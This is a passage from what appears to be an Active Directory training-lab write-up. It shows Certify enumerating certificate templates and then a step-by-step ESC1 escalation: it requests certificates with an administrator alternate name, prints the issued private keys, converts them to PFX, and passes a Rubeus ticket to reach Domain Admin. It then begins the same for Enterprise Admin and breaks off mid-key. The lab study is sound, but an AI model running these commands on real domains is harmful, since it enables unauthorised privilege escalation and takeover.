    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Users
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies                  : Certificate Request Agent
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : CA-Integration
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

Certify completed in 00:00:16.8362617
```

### Privilege Escalation to DA and EA using ESC1

The template HTTPSCertificates looks interesting. Let's get some more information about it as it allows 
requestor to supply subject name.

* C:\AD\Tools> C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None
Enabled certificate templates where users can supply a SAN:
    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
Certify completed in 00:00:15.9132020
```

Sweet! The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. 
Recall that studentx is a member of RDPUsers group. This means that we can request certificate for any user as studentx. 

Let's request a certificate for Domain Admin - Administrator

* C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student731
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates
[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 33

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA5niomQ13Ks3Cvi9u9M6RC5PdlDgxA9vUHcx3UBLsRI7EfTkM
eKFW7Rq76ROHvP2JGz75hcSIhtxWqna6nNpel9P28+nIpTHCBQnF9TaFeut15TNe
qjuLcbHSh+nYM5AW/H8rLM/UjRmA5/pof4odgc6ck1CwAvSAshFd49uXAepJESAl
OcbGivFZ8k8xQp+CUwh0L6FWCjb3RovL5ZFMoXr3neOm+chJBAV0cCq29KYsl7qd
asw8WPRyt0F6JDgi1/n6q1/sWP/uYK9nERpXu2612NyB3G1CzTeMPpszgFsZEpRh
yI5898uizsoeLeFGk5kOmwiBUIAQmEidKFTQ8QIDAQABAoIBAG0lhUr+iooV6f1h
v11mmmBuRYiVV/ko2XrHQ1YDsCsDpeBb7SEP33foqkdGfYkuVQk3OLp2CeY8YTrX
gacY76Vdt91pwSEiwGzcZQitKme9LRc/zbw2+OH+QeMmBsLcoVYw74SIZHPyOQ8j
kuubwD+iVpqZotGzc2NhQCLR8uDvakqCXsD6ynGr3HxnpM6q+ZpbePdZX1ZEUove
YXLO9YVO7dlLLIn5tFGnU60ig/uMEohVOjLDntkWLxgznKehArHSTC+bIo1IHE3u
KslBzAEvl7itGiJKqngReMLk+qFt9E3+NtliBU4fLq4n+xjFhmhKaSaaOMLtOzrx
m/w4iqUCgYEA7SaqH+clOUU5YKzJYYxH7cc6E0Gp0hxLfD9i3KrPP+k0TZGx+jmZ
08lD6g9w+mNML1Z4cLZ/0xXjRktFgOrZTdAtpfvc+L5OcNmGiI9UK+cxv5HR6rrK
++36O/r4TxVaN6TgxOQ5rHXB6aIHIm5+7zxNd23bEgnTy/QWQHgVqisCgYEA+MoU
0DfFNrH5WQoZ+O8usQyZ+7eVY4zCNUE0BpZAjMeMS19rG8l5p46ksZxd6H9N0HJ+
fU5TxZQWzjlVmZFIYLlEVYcXtPjbl7lWgkezqxUuACHE5PurQtleBOWu1u/gn715
X5xobE6ycTsoV/sx8ohj4tqRiDWO1DVd4ViSb1MCgYEA2qVGPsm22RmIsCg+NzDF
9GU1lyF4N96cff5W4Mqe7/bLoSTN6b0HpWqvsfHwoPnB+PcJbinkqjJI67tkZlqg
ZQyluZ3/+lpDKep0Dh3PZfbvOAdyea8kjKe5iWl3XDp8hkb+cKlWvzmGwif/2e/0
GhAIAC+JxhTHcAgoJ+JPXycCgYEAqAHHlmjjHDGJwnBI48uZy2RIJC1wi76Fc/Mp
T/1tb+RdwJSaPzSKm/V/EJYY8KXvhYGcG8CmX7nGwNMFFGSA7RiPpfZJsyOPH2HA
otAK69CstNgZH804dTdW/5WfwXRSS21npoJ4HhPy+vZJI0j2DOPAGHUjbElGv9We
JUxr7xMCgYEAlSviueNHWc4ZcfPNTV9tv/AgPGj4rkxEG8lzCnV2rlJWtYKZec2k
9191z0nXAB2pRXzTD1g8lqvhQAO3U3FcqMa8VGHAlYH6GCZvJDHefMLaKLK/Og1X
vwVe4ERKPsH7CJrd+XUNUEyggAkffoSOM29yk494NZhplPo2N4aHn8Q=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYjCCBUqgAwIBAgITFQAAACEFIQ6alFc2ygAAAAAAITANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
MDIyMzBaFw0yNzA5MzAwMDMyMzBaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5niomQ13Ks3Cvi9u9M6RC5PdlDgx
A9vUHcx3UBLsRI7EfTkMeKFW7Rq76ROHvP2JGz75hcSIhtxWqna6nNpel9P28+nI
pTHCBQnF9TaFeut15TNeqjuLcbHSh+nYM5AW/H8rLM/UjRmA5/pof4odgc6ck1Cw
AvSAshFd49uXAepJESAlOcbGivFZ8k8xQp+CUwh0L6FWCjb3RovL5ZFMoXr3neOm
+chJBAV0cCq29KYsl7qdasw8WPRyt0F6JDgi1/n6q1/sWP/uYK9nERpXu2612NyB
3G1CzTeMPpszgFsZEpRhyI5898uizsoeLeFGk5kOmwiBUIAQmEidKFTQ8QIDAQAB
o4IDDjCCAwowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSdwIZo+FCsqSgBiBA1q+riIiBjfTAo
BgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNYWRtaW5pc3RyYXRvcjAfBgNVHSME
GDAWgBTR/o0Kp/q0Mp82/CC498ueaMVF7TCB2AYDVR0fBIHQMIHNMIHKoIHHoIHE
hoHBbGRhcDovLy9DTj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049bWNvcnAtZGMs
Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
PUNvbmZpZ3VyYXRpb24sREM9bW9uZXljb3JwLERDPWxvY2FsP2NlcnRpZmljYXRl
UmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q
b2ludDCBywYIKwYBBQUHAQEEgb4wgbswgbgGCCsGAQUFBzAChoGrbGRhcDovLy9D
Tj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bW9uZXlj
b3JwLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0
aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQBVCk4EyDerfdh6
oJNb8eYpz04bDdnpI/eCNNovAdM29aPlUu50ab02vko7dcJxPJ5c8jQqlt8konNj
1n1uoK2tf9lv9LeS0zVVzQy7Q5KvgrOvKA8P2Au+USim3IITWGnPEhpJO9KjIiPU
JnXFD7MGLtOq5Y4yTtEU1A2ct4HKQW+7BWk+bgfPgD2CGuqhJqphb/ccS22i1Z2G
BbDBAsLjIVId488mu8ZbxcV3cxM+XdWyF8IQg2IrthQ8+yycI2FnRJ875HWuTEH+
wdYrQe6Z7M8vgyajQLWf2HcHwbZ+HJm9JlXX+/GFKlmCh0dqMKDARdmdAys/BJST
mrO8PBOk
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:05.3735595
```

Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to esc1.pem

We need to convert it to PFX to use it. 
Use openssl binary on the student VM to do that. I will use SecretPass@123 as the export password

![alt text](image-50.png)

* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
```

Use the PFX created above with Rubeus to request a TGT for DA - Administrator!

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt

```_____ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/
 V2.2.1
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, 
DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 
'dollarcorp.moneycorp.local\administrator'
[+] TGT request successful!
```

Check if we actually have DA privileges now:

* C:\AD\Tools> winrs -r:dcorp-dc cmd /c set username
```
USERNAME=administrator
```

Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate 
for Enterprise Administrator - Administrator

* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator

```

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student731
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates
[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : moneycorp.local\administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 35

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwuFVC9GjEmKKHCbqGEmYAvAB2H5pYjkSDZeh5IKMBaSHzszx
eicYWCpWvm0vyIWr2tWN5sIE5ptrYqGN6zhoP8PpC02FyXso1I/vDc+JiEqZTOKm
UfnyrClktHUE6REk/oME8kouD0DhlZB8qA3Vp+gDG9JFG+SKkuwEeWN93mejCRIv
PuCdU51YkNrQ8UE1SFGQigzTUVo5Np81+dP0PpsnS2EqxcI6l4qJPx347RjARaBo
f80NzkcGjjw+/zapKzIHae6SfNlHa1nzwBNqxLP2jTKnP84VUtXrWRuwTX5YTXrs
83+MJn/L8J1nBEs7/2CQAq16aghrHvXgl5k1YQIDAQABAoIBAQCyoevcBpBs5Mhm
H8GK+8KMRsXaVZ1xvJBwxyJNnOCOt48JH9DlQHrPLhgPO3SGYQjzcbc943CslaAs
a5v0FeNxN7ohczEES5FUro7Y4PjXZlH5KPR9xhgMeXDm/TDAFsgLR7u8AAUSVE2z
VBr/zJag70oSMX7Jn4bqP8+mGW2h81DJscxr3sYV0TIw007JpKxVaDa9C9i0zuVV
hw9Is81E8JzehDUovnJ+pLEaIk+fsGjJWbskLb0wzJ2ncuwY7iXKCAl8/KIu69x8
VGDhHVLqT/1b2mlzblLsU7MPRw4JK2y8fV0HwqRwASTQValJPSu8alkWKnBqUPmw
MschrUm1AoGBAPFL7SnNr4ksMh3B8lBzsoluIon8dVHfFWOvm7/zfJFWGanBSZIU
hm8tXj+6PegMLhYsW9fqAxBc6PgOHjrGvuMp2x7PsrRLBfF4Y+Ps4qZ/wPqARZ+t
BWcoTE5YX2FilSe2+KSnQMyDhPHzty/JdVb6PBsjkoXMn3fuS2i0bdpjAoGBAM7B
VvTxb5hIcJyn8X/isoXzSA+pvIWdlZNmchKm/G8FPLtw77KUvjQUor+6odCzXqsh
iYNyhYGk/eg7aUNuiED5SlBPTtbe/IRXz0o7EUhgd0ifGH/p/ei0D7qf4VBLChjs
nbG+UEeLmmo6fiKKbw1obRHuNKvMy8T6VHuk4bprAoGBAImfl4YHRX4EUhU84DrY
slTGFzcCYduvVCDGMRwbAMpYBE0Y7CBASqiwhJfuXo6yG7sT09JjKxozE8EfNEir
